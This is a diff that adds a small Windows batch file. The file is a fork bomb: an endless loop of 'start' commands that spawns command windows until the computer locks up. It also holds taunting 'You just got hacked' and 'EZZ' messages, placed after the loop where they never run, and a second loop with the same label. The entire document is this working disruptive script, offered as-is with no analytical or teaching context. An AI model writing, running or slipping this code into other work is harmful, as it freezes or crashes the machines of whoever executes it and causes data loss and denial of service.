@@ -1,0 +1,22 @@
+@echo off
+
+:loop
+start
+start
+start
+start
+start
+start
+start
+start
+goto loop
+
+
+echo You just got hacked
+:loop
+start
+start
+start
+goto loop
+
+echo EZZ
